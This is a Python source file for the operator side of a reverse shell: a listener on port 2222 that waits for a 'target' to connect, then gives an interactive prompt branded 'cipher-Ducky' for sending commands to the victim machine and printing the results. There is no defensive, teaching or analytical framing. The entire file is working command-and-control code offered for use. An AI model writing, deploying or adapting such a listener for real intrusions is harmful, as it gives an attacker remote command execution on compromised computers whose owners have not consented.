import socket
import json
import os
import termcolor
import time

HOST_IP = '0.0.0.0'
PORT = 2222
CHUNK_SIZE = 8192

def send_command(sock, data):
    try:
        jsondata = json.dumps(data)
        sock.sendall(jsondata.encode())
        return True
    except socket.error as e:
        print(termcolor.colored(f"\n[!] Error sending command: {e}", "red"))
        return False

def receive_output(sock, timeout=10):
    data = ''
    sock.settimeout(timeout)
    try:
        while True:
            try:
                chunk = sock.recv(1024).decode()
                if not chunk:
                    return None
                data += chunk
                return data  # Directly return the data as it is
            except json.JSONDecodeError:
                continue
            except socket.timeout:
                print(termcolor.colored("\n[!] Timeout waiting for response", "yellow"))
                return None
    except Exception as e:
        print(termcolor.colored(f"\n[!] Error receiving output: {e}", "red"))
        return None
    finally:
        sock.settimeout(None)

def shell(sock):
    while True:
        try:
            command = input(termcolor.colored("#-cipher-Ducky >> ", "blue")).strip()
            if not command:
                continue

            if command == ":kill":
                sock.sendall(":kill".encode())
                break

            if not send_command(sock, command):
                print(termcolor.colored("[!] Failed to send command", "red"))
                continue

            response = receive_output(sock)
            if response is None:
                print(termcolor.colored("[!] No response from target", "red"))
                break
            else:
                print(response)

        except KeyboardInterrupt:
            print(termcolor.colored("\n[!] Use ':kill' to terminate the session", "yellow"))
            continue
            
        except Exception as e:
            print(termcolor.colored(f"\n[!] Error in shell: {str(e)}", "red"))
            break

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind((HOST_IP, PORT))
        server.listen(5)
        print(termcolor.colored(f"[*] Server started on port {PORT}", "green"))
        print(termcolor.colored("[*] Waiting for incoming connections...", "yellow"))

        while True:
            client_socket, address = server.accept()
            print(termcolor.colored(f"\n[+] Target connected from {address[0]}:{address[1]}", "green"))
            shell(client_socket)
            
            print(termcolor.colored("\n[*] Session ended. Waiting for new connection...", "yellow"))
            try:
                client_socket.close()
            except:
                pass

    except Exception as e:
        print(termcolor.colored(f"[!] Critical error: {e}", "red"))
    finally:
        server.close()

if __name__ == "__main__":
    main()
